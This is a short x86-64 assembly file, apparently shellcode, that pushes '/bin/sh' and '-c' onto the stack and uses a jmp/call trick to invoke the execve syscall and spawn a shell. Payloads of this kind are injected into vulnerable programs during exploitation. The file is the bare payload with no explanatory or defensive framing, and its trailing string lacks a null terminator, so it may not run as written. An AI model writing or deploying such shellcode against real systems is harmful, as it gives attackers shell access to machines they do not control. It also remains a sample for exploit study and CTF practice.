BITS 64
global _start
section .text
_start:
    xor rax, rax
    xor rdx, rdx

    ; Push /bin/sh as 8 bytes with null terminator
    ; /bin/sh = 0x0068732f6e69622f (note leading \x00 for null term)
    mov rdi, 0x68732f6e69622f ; 7 bytes, no double slash
    push rax                   ; null terminator
    push rdi
    mov rdi, rsp

    push rax
    push word 0x632d           ; "-c"
    mov rsi, rsp

    push rax
    jmp cmd
end:
    push rsi
    push rdi
    mov rsi, rsp
    mov al, 59
    syscall
cmd:
    call end
    db "/bin/sh"
